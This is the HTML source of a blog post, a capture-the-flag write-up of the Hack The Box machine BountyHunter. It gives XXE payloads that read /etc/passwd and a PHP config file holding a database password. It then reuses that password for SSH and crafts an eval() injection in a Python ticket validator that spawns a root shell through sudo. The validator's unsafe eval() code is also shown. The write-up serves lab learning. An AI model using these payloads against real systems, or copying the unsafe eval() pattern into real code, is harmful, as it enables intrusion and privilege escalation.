@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>BountyHunter Writeup / Walkthrough Hack the box</title>
+
+  <link rel="icon" type="image/png" href="/assets/images/logo.png?v=96ad5fd1fb">
+  <link rel="apple-touch-icon" href="/assets/images/logo.png?v=96ad5fd1fb">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css?v=96ad5fd1fb">
+
+  <meta name="description" content="Writeup on BountyHunter (Linux HackTheBox), w/o Metasploit, exploiting XXE &amp; performing code analysis for Privilege escalation.">
+    <link rel="canonical" href="https://sheerazali.com/blog/bountyhunter-writeup-walkthrough-hack-the-box/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Sheeraz Ali">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="BountyHunter Writeup / Walkthrough Hack the box">
+    <meta property="og:description" content="Writeup on BountyHunter (Linux HackTheBox), w/o Metasploit, exploiting XXE &amp; performing code analysis for Privilege escalation.">
+    <meta property="og:url" content="https://sheerazali.com/blog/bountyhunter-writeup-walkthrough-hack-the-box/">
+    <meta property="og:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/10/image-10.png?fit&#x3D;805%2C485&amp;ssl&#x3D;1">
+    <meta property="article:published_time" content="2021-11-20T17:05:05.000Z">
+    <meta property="article:modified_time" content="2021-12-01T11:11:15.000Z">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Writeup">
+    
+    <meta property="article:publisher" content="https://www.facebook.com/ghost">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="BountyHunter Writeup / Walkthrough Hack the box">
+    <meta name="twitter:description" content="Writeup on BountyHunter (Linux HackTheBox), w/o Metasploit, exploiting XXE &amp; performing code analysis for Privilege escalation.">
+    <meta name="twitter:url" content="https://sheerazali.com/blog/bountyhunter-writeup-walkthrough-hack-the-box/">
+    <meta name="twitter:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/10/image-10.png?fit&#x3D;805%2C485&amp;ssl&#x3D;1">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="sheeraz ali">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="HackTheBox, Writeup">
+    <meta name="twitter:site" content="@beingsheerazali">
+    <meta property="og:image:width" content="805">
+    <meta property="og:image:height" content="485">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Sheeraz Ali",
+        "url": "https://sheerazali.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://sheerazali.com/favicon.ico"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "sheeraz ali",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://www.gravatar.com/avatar/b78e4b3b7f8de6d5dafee8306d76ace7?s=250&r=x&d=mp",
+            "width": 250,
+            "height": 250
+        },
+        "url": "https://sheerazali.com/author/sheeraz/",
+        "sameAs": []
+    },
+    "headline": "BountyHunter Writeup / Walkthrough Hack the box",
+    "url": "https://sheerazali.com/blog/bountyhunter-writeup-walkthrough-hack-the-box/",
+    "datePublished": "2021-11-20T17:05:05.000Z",
+    "dateModified": "2021-12-01T11:11:15.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/10/image-10.png?fit=805%2C485&ssl=1",
+        "width": 805,
+        "height": 485
+    },
+    "keywords": "HackTheBox, Writeup",
+    "description": "Writeup on BountyHunter (Linux HackTheBox), w/o Metasploit, exploiting XXE &amp; performing code analysis for Privilege escalation.",
+    "mainEntityOfPage": "https://sheerazali.com/blog/bountyhunter-writeup-walkthrough-hack-the-box/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.130">
+    <link rel="alternate" type="application/rss+xml" title="Sheeraz Ali" href="https://sheerazali.com/rss/">
+    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.51/umd/portal.min.js" data-i18n="true" data-ghost="https://sheerazali.com/" data-key="15f06e61ecb8d951198e7015b6" data-api="https://sheerazali.com/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="15f06e61ecb8d951198e7015b6" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="https://sheerazali.com/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="https://sheerazali.com/webmentions/receive/" rel="webmention">
+    <script defer src="/public/cards.min.js?v=96ad5fd1fb"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=96ad5fd1fb">
+    <script defer src="/public/member-attribution.min.js?v=96ad5fd1fb"></script><style>:root {--ghost-accent-color: #FF1A75;}</style>
+</head>
+<body class="post-template tag-hackthebox tag-writeup tag-hash-import-2026-01-05-15-55">
+
+<div class="terminal-wrapper">
+
+  <header class="site-header">
+  <div class="container">
+    <div class="header-content">
+
+      <a href="https://sheerazali.com/" class="site-logo">
+        <img src="/assets/images/logo.png" alt="Sheeraz Ali">
+      </a>
+
+      <nav class="main-nav">
+        <ul>
+          <li><a href="https://sheerazali.com/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>home<span class="bracket">]</span></a></li>
+          <li><a href="/blog/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>blog<span class="bracket">]</span></a></li>
+          <li><a href="/timeline/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>timeline<span class="bracket">]</span></a></li>
+          <li><a href="/resume/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>resume<span class="bracket">]</span></a></li>
+          <li><a href="https://www.codevigilant.com/author/syed_sheeraz_ali/" target="_blank" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>cves<span class="bracket">]</span></a></li>
+          <li><a href="https://sheerazali.com/#contact" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>contact<span class="bracket">]</span></a></li>
+        </ul>
+      </nav>
+
+      <div class="header-status">
+        <span class="status-indicator">
+          <span class="status-dot"></span>
+          <span class="status-text">Online</span>
+        </span>
+      </div>
+
+    </div>
+  </div>
+</header>
+
+  <main class="main-content">
+    
+<article class="single-post">
+  <div class="container">
+
+    <header class="post-header">
+      <div class="post-meta-top">
+        <a href="https://sheerazali.com/tag/hackthebox/" class="post-category">HackTheBox</a>
+        <span class="post-date">November 20, 2021</span>
+        <span class="reading-time">11 min read</span>
+      </div>
+
+      <h1 class="post-title glitch" data-text="BountyHunter Writeup / Walkthrough Hack the box">BountyHunter Writeup / Walkthrough Hack the box</h1>
+
+      <div class="post-author">
+        <span class="author-label">Author:</span>
+        <a href="https://sheerazali.com/author/sheeraz/">sheeraz ali</a>
+      </div>
+    </header>
+
+    <div class="featured-image">
+      <img src="https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/10/image-10.png?fit&#x3D;805%2C485&amp;ssl&#x3D;1" alt="BountyHunter Writeup / Walkthrough Hack the box">
+    </div>
+
+    <div class="post-body">
+      <div class="content-wrapper">
+        <div class="terminal-window">
+          <div class="terminal-header">
+            <span class="terminal-dot red"></span>
+            <span class="terminal-dot yellow"></span>
+            <span class="terminal-dot green"></span>
+            <span class="terminal-title">BountyHunter Writeup / Walkthrough Hack the box</span>
+          </div>
+          <div class="terminal-content">
+            <figure class="kg-card kg-image-card"><img src="/assets/images/blog/2021_10_image-10.png" class="kg-image" alt loading="lazy" width="748" height="451"></figure><h1 id="tldr">TL;DR</h1><p><strong>T</strong>his is a walkthrough writeup on BountyHunter which is a Linux box categorized as easy on HackTheBox. The initial foothold was gained by discovering and exploiting XXE vulnerability, meanwhile the privilege escalation part was interesting and required us to do some basic code analysis. This was my first ever Active Box which I rooted, so I was quick on releasing a writeup on it 🤗</p><h1 id="walkthrough">Walkthrough</h1><h2 id="bountyhunter-writeup-scanning-network">BountyHunter Writeup: Scanning Network</h2><p>Running the usual Nmap port scan :</p><pre><code class="language-markdown">Command used --&gt; nmap -n -Pn -A -sC -sV -v -oN nmap.initial 10.10.11.100
+Increasing send delay for 10.10.11.100 from 0 to 5 due to 148 out of 493 dropped probes since last increase.
+Nmap scan report for 10.10.11.100
+Host is up (0.26s latency).
+Not shown: 998 closed ports
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Bounty Hunters
+
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</code></pre><p>We gotta deal with :<br><code>port 80</code> : web-server<br><code>port 22</code> : SSH</p><h2 id="web-enumeration">Web Enumeration</h2><p>Visiting the website on the browser –&gt;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_10_image.png" class="kg-image" alt loading="lazy" width="770" height="477"><figcaption>/index.php</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_10_image-1.png" class="kg-image" alt loading="lazy" width="770" height="151"><figcaption>/portal.php</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_10_image-2.png" class="kg-image" alt="BountyHunter Writeup" loading="lazy" width="770" height="213"><figcaption>/log_submit.php</figcaption></figure><h3 id="bountyhunter-writeup-logsubmitphp">BountyHunter Writeup :<code>log_submit.php</code></h3><p>We can fill this Bounty Report System form with the bug info and submit it.<br>On, submitting the form the details are reflected back on the webpage… Huhh, interesting..Let’s come back to this later.</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2021_10_image-3.png" class="kg-image" alt="BountyHunter Writeup" loading="lazy" width="770" height="311"></figure><h2 id="running-a-dirbuster-scan">Running a Dirbuster scan</h2><p>We found some interesting files on running a Dirbuster scan :  <code>db.php</code>, <code>/resources/README.txt</code></p><pre><code class="language-markdown">DirBuster 1.0-RC1 - Report
+
+http://10.10.11.100:80
+--------------------------------
+Directories found during testing:
+
+Dirs found with a 200 response:
+
+/
+/resources/
+
+Dirs found with a 403 response:
+
+/assets/
+/css/
+/icons/
+/assets/img/
+/assets/img/portfolio/
+/js/
+/icons/small/
+
+--------------------------------
+Files found during testing:
+
+Files found with a 200 responce:
+
+/index.php
+/portal.php
+/assets/img/avataaars.svg
+/resources/jquery.easing.min.js
+/resources/bootstrap.bundle.min.js
+/resources/jquery.min.js
+/resources/README.txt
+/js/scripts.js
+/log_submit.php
+/resources/bountylog.js
+/resources/lato.css
+/resources/bootstrap_login.min.js
+/resources/monsterat.css
+/resources/jquery_login.min.js
+/resources/all.js
+/db.php
+
+--------------------------------</code></pre><p>Browsing the contents of these file,s we got some interesting finds.</p><p>Browsing <code>db.php</code> gave us nothing but a blank page.</p><p><code>/resources/README.txt</code> did reveal a tasks checklist</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2021_10_image-4.png" class="kg-image" alt="BountyHunter Writeup" loading="lazy" width="770" height="212"></figure><pre><code class="language-markdown">Tasks:
+
+[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
+[X] Write tracker submit script
+[ ] Connect tracker submit script to the database
+[X] Fix developer group permissions</code></pre><hr><h2 id="going-burrrrp">Going Burrrrp !</h2><p>While intercepting the web requests in BurpSuite, we saw that in the <code>POST</code> request that was sent on submitting the “Bounty Report form”, there was some encoded data being sent in that POST request.</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2021_10_image-5.png" class="kg-image" alt="BountyHunter Writeup" loading="lazy" width="770" height="176"></figure><p>Decoding this data string in the following sequence <code>Data —&gt; URL —&gt; base64</code>, (if you are wondering about how I thought about this., it was just hit and trial for me 😉), we saw that the form data was being sent in XML format.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_10_image-6.png" class="kg-image" alt="BountyHunter Writeup" loading="lazy" width="770" height="235"><figcaption>decoding data</figcaption></figure><pre><code class="language-markdown">Encoded data= 
+PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5yY2UgdmlhIHh4ZTwvdGl0bGU%2BCgkJPGN3ZT42OTY5PC9jd2U%2BCgkJPGN2c3M%2BNTwvY3Zzcz4KCQk8cmV3YXJkPjEwMDwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg%3D%3D</code></pre><pre><code class="language-xml">Decoded Data=
+
+&lt;?xml  version="1.0" encoding="ISO-8859-1"?&gt;
+		&lt;bugreport&gt;
+		&lt;title&gt;rce via xxe&lt;/title&gt;
+		&lt;cwe&gt;6969&lt;/cwe&gt;
+		&lt;cvss&gt;5&lt;/cvss&gt;
+		&lt;reward&gt;100&lt;/reward&gt;
+		&lt;/bugreport&gt;</code></pre><p>There might be  some potential for XXE.. Let’s try it then 🙂</p><blockquote>XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application’s processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.<br><br>source – <a href="//portswigger.net/web-security/xxe">What is XXE (XML external entity) injection?</a></blockquote><hr><h2 id="bountyhunter-writeup-intial-foothold-exploiting-xxe">BountyHunter Writeup: Intial Foothold (Exploiting XXE)</h2><p>Refer to this for XXE payloads -&gt;  <a href="//github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection" rel="noreferrer noopener">PayloadsAllTheThings/XXE Injection</a></p><p>Using the payload  <code>&lt;!DOCTYPE title [&lt;!ENTITY cmd SYSTEM 'file:///etc/passwd'&gt;]&gt;</code></p><pre><code class="language-xml">&lt;?xml  version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE title [&lt;!ENTITY cmd SYSTEM 'file:///etc/passwd'&gt;]&gt;
+		&lt;bugreport&gt;
+		&lt;title&gt;rce via xxe&lt;/title&gt;
+		&lt;cwe&gt;6969&lt;/cwe&gt;
+		&lt;cvss&gt;5&lt;/cvss&gt;
+		&lt;reward&gt;100&lt;/reward&gt;
+		&lt;/bugreport&gt;</code></pre><p>Then encoding it in the reverse sequence  <code>xml-data → base64 → URLencode</code> . Then sending this request.</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2021_10_image-7.png" class="kg-image" alt="BountyHunter Writeup" loading="lazy" width="770" height="324"></figure><p>BOOM! We can successfully read the <code>/etc/passwd</code> file means we have XXE !</p><pre><code class="language-markdown">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+development:x:1000:1000:Development:/home/development:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</code></pre><p>Nice, we have a user <code>development</code> except the <code>root</code> user. Further, I tried to get more files, like</p><pre><code class="language-markdown">/home/development/user.txt
+/home/development/.ssh/id_rsa
+/var/www/sheerazali.com/db.php</code></pre><p>But I wasn’t able to view them, also i wasn’t able to perform code execution using the <code>expect</code> php module.</p><p><code>&lt;!DOCTYPE title [&lt;!ENTITY cmd SYSTEM 'expect://id'&gt;]&gt;</code> but that too didn’t work.</p><hr><p>Eventually, I tried to retrieve files using <code>php base64 filter</code>. (another cool way to circumvent file retrieval hinderance)</p><p><code>&lt;!DOCTYPE title [&lt;!ENTITY cmd SYSTEM 'php://filter/convert.base64-encode/resource=index.php'&gt;]&gt;</code></p><p>Trying to view the <code>db.php</code> file (the one we found during web enumeration)</p><pre><code class="language-xml">&lt;?xml  version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE title [&lt;!ENTITY cmd SYSTEM 'php://filter/convert.base64-encode/resource=db.php'&gt;]&gt;
+		&lt;bugreport&gt;
+		&lt;title&gt;&amp;cmd;&lt;/title&gt;
+		&lt;cwe&gt;6969&lt;/cwe&gt;
+		&lt;cvss&gt;5&lt;/cvss&gt;
+		&lt;reward&gt;100&lt;/reward&gt;
+		&lt;/bugreport&gt;</code></pre><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_10_image-8.png" class="kg-image" alt="BountyHunter Writeup" loading="lazy" width="770" height="320"><figcaption>Response with base64 encoded filedata</figcaption></figure><pre><code class="language-markdown">Base64 encoded content of db.php in the responce :
+
+PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=</code></pre><p>Decoding this as <code>Base64</code> we get —&gt;</p><pre><code class="language-php">&lt;?php
+// TODO -&gt; Implement login system with the database.
+$dbserver = "localhost";
+$dbname = "bounty";
+$dbusername = "admin";
+$dbpassword = "m19RoAU0hP41A1sTsq6K";
+$testuser = "test";
+?&gt;</code></pre><p>Yayy! We got the creds. Using them on SSH for user <code>root</code> &amp; <code>admin</code> didn’t work.</p><p>But remember we got a user named <code>development</code> in the <code>/etc/passwd</code> file. so lets try the obtained password for this user on SSH.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_10_image-9.png" class="kg-image" alt="BountyHunter Writeup" loading="lazy" width="770" height="405"><figcaption>SSH as development</figcaption></figure><p>And there we have our user shell ^_^</p><h2 id="bountyhunter-writeup-user-flag-%E2%9B%B3">BountyHunter Writeup : User Flag ⛳</h2><pre><code class="language-bash">development@bountyhunter:~$ cat user.txt 
+df63624da724e953e2120e8efa272649</code></pre><hr><h2 id="privilege-escalation">Privilege Escalation</h2><p>Another file, <code>contract.txt</code>, was in the <code>/home/development</code> which says →</p><pre><code class="language-markdown">development@bountyhunter:~$ cat contract.txt 
+Hey team,
+
+I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.
+
+This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.
+
+I set up the permissions for you to test this. Good luck.
+
+-- John</code></pre><p>Checking sudo permissions on user <code>development</code></p><pre><code class="language-bash">development@bountyhunter:~$ sudo -l
+Matching Defaults entries for development on bountyhunter:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User development may run the following commands on bountyhunter:
+    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</code></pre><p>On further enumeration, we found <code>ticket_validator.py</code> program which we have the permission to run as <code>root</code>. And we also got some <code>invalid tickets</code>, which have the following format –&gt;</p><pre><code class="language-bash">development@bountyhunter:~$ cd /opt
+
+development@bountyhunter:/opt$ cd skytrain_inc/
+
+development@bountyhunter:/opt/skytrain_inc$ ls -al
+total 16
+drwxr-xr-x 3 root root 4096 Jul 22 11:08 .
+drwxr-xr-x 3 root root 4096 Jul 22 11:08 ..
+drwxr-xr-x 2 root root 4096 Jul 22 11:08 invalid_tickets
+-r-xr--r-- 1 root root 1471 Jul 22 11:08 ticketValidator.py
+
+development@bountyhunter:/opt/skytrain_inc$ cd invalid_tickets/
+
+development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ ls -al
+total 24
+drwxr-xr-x 2 root root 4096 Jul 22 11:08 .
+drwxr-xr-x 3 root root 4096 Jul 22 11:08 ..
+-r--r--r-- 1 root root  102 Jul 22 11:08 390681613.md
+-r--r--r-- 1 root root   86 Jul 22 11:08 529582686.md
+-r--r--r-- 1 root root   97 Jul 22 11:08 600939065.md
+-r--r--r-- 1 root root  101 Jul 22 11:08 734485704.md
+
+development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ cat 390681613.md 
+# Skytrain Inc
+## Ticket to New Haven
+__Ticket Code:__
+**31+410+86**
+##Issued: 2021/04/06
+#End Ticket</code></pre><h3 id="python-code-analysis">Python Code Analysis</h3><p>Going ahead and examining the <code>ticketValidator.py</code> python code.</p><pre><code class="language-python">def load_file(loc):           
+    if loc.endswith(".md"):
+        return open(loc, 'r')   
+    else:       
+        print("Wrong file type.")
+        exit()
+    
+def evaluate(ticketFile):
+    #Evaluates a ticket to check for ireggularities.
+    code_line = None
+    for i,x in enumerate(ticketFile.readlines()):
+        if i == 0:
+            if not x.startswith("# Skytrain Inc"):
+                return False
+            continue
+        if i == 1:
+            if not x.startswith("## Ticket to "):
+                return False
+            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
+            continue
+
+        if x.startswith("__Ticket Code:__"):
+            code_line = i+1
+            continue
+
+        if code_line and i == code_line:
+            if not x.startswith("**"):
+                return False
+            ticketCode = x.replace("**", "").split("+")[0]
+            if int(ticketCode) % 7 == 4:
+                validationNumber = eval(x.replace("**", ""))
+                if validationNumber &gt; 100:
+                    return True
+                else:
+                    return False
+    return False
+
+def main():
+    fileName = input("Please enter the path to the ticket file.\n")
+    ticket = load_file(fileName)
+    #DEBUG print(ticket)
+    result = evaluate(ticket)
+    if (result):
+        print("Valid ticket.")
+    else:
+        print("Invalid ticket.")
+    ticket.close
+
+main()</code></pre><h3 id="execution">Execution</h3><pre><code class="language-bash">development@bountyhunter:/opt/skytrain_inc$ cat ./invalid_tickets/390681613.md 
+# Skytrain Inc
+## Ticket to New Haven
+__Ticket Code:__
+**31+410+86**
+##Issued: 2021/04/06
+#End Ticket
+
+development@bountyhunter:/opt/skytrain_inc$ python3 ticketValidator.py 
+Please enter the path to the ticket file.
+./invalid_tickets/390681613.md
+Destination: New Haven
+Invalid ticket.
+
+development@bountyhunter:/opt/skytrain_inc$</code></pre><h3 id="explaination">Explaination</h3><p>So, this code takes in a ticket file with a <code>.md</code> file extension and performs validation on it.<br>The code snippet of interest to us is —&gt;</p><pre><code class="language-python">if code_line and i == code_line:
+            if not x.startswith("**"):
+                return False
+            ticketCode = x.replace("**", "").split("+")[0]
+            if int(ticketCode) % 7 == 4:
+                validationNumber = eval(x.replace("**", ""))
+                if validationNumber &gt; 100:
+                    return True
+                else:
+                    return False</code></pre><p>It is examining the following<strong> line 4</strong> of the <code>ticket.md</code> file—&gt;</p><pre><code class="language-markdown">**31+410+86**</code></pre><p>The code checks for the following to validate the ticket —</p><p><strong>Action 1</strong> : If the line starts with “**”, continue.</p><p><strong><strong>Action</strong> 2</strong> :Splits the string by considering “<strong>+</strong>” as the delimitter, takes the first part at index 0 and replaces “**” with nothing (basically removes it), and stores it as <code>ticketcode</code>.</p><pre><code class="language-markdown">**31+410+86**  --&gt;  [**31,410,86**]  --&gt;  **31
+ticketcode = 31</code></pre><p><strong><strong>Action</strong> 3</strong> : If this <code>ticketcode</code> satisfies <code>ticketcode% 7 ==4</code>, then continue.</p><pre><code class="language-markdown">31 % 7 == 3
+condition check : false
+so this particular ticket is labelled as invalid.
+
+Although, for the sake of understanding the next check, let us assume that this condition check was passed 🙄</code></pre><p><strong>Action 4 : </strong>Remove the “**” from the original string and evaluate value of the expression.</p><pre><code class="language-markdown">**31+410+86**  --&gt;  (31+410+86)
+eval(31+410+86) = 527
+527 &gt; 100
+
+condition check : true
+Now, the ticket has passed all checks and it will be labelled as Valid.</code></pre><p>If the result of this evaluated expression is &gt; 100 then return True.</p><hr><h3 id="eval-exploit"><code>eval()</code> exploit</h3><p>Now <code>eval()</code> function in Python is vulnerable. This function will also execute the python code given to it. In this case the input it takes is not being sanitized, so we can provide malicious python code to it, spawning a root shell (cause we have the permission to run this program as root). Read more about it <a href="http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html?ref=localhost" rel="noreferrer noopener">here</a>.</p><p>Now I used the following string, which satisfies all the conditions in order for the <code>eval()</code> function to execute the code and spawn a shell.</p><pre><code class="language-python">** 32 + 1 == 33 and __import__('os').system('/bin/bash')==False</code></pre><p>As this string satisfies all the conditions from 1 to 3 which are required to be satisfied in order to execute the <code>eval()</code> function, let’s create a <code>ticket.md</code> file with this content in the <code>/tmp</code> directory (as we have write permissions in this), and run  <code>ticketValidator.py</code>  on it</p><pre><code class="language-markdown"># Skytrain Inc
+## Ticket to New Haven
+__Ticket Code:__
+** 32 + 1 == 33 and __import__('os').system('/bin/bash')==False
+##Issued: 2021/04/06
+#End Ticket</code></pre><pre><code class="language-bash">development@bountyhunter:/opt/skytrain_inc$ cd /tmp
+
+development@bountyhunter:/tmp$ echo "# Skytrain Inc
+&gt; ## Ticket to New Haven
+&gt; __Ticket Code:__
+&gt; ** 32 + 1 == 33 and __import__('os').system('/bin/bash')==False
+&gt; ##Issued: 2021/04/06
+&gt; #End Ticket" &gt; ticket.md</code></pre><h2 id="root-flag-%E2%9B%B3">Root Flag ⛳</h2><p>Executing <code>ticketValidator.py</code> as root.</p><pre><code class="language-bash">development@bountyhunter:/tmp$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+Please enter the path to the ticket file.
+/tmp/ticket.md
+Destination: New Haven
+
+root@bountyhunter:/tmp# whoami
+root
+
+root@bountyhunter:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@bountyhunter:/tmp# cat /root/root.txt
+2rfs7*************************</code></pre><p>Yayyy, we have successfully rooted BountyHunter 🙂</p><hr><p>Until next time, do checkout other informative writeups and blogs <a href="https://sheerazali.com/">here</a>.</p>
+          </div>
+        </div>
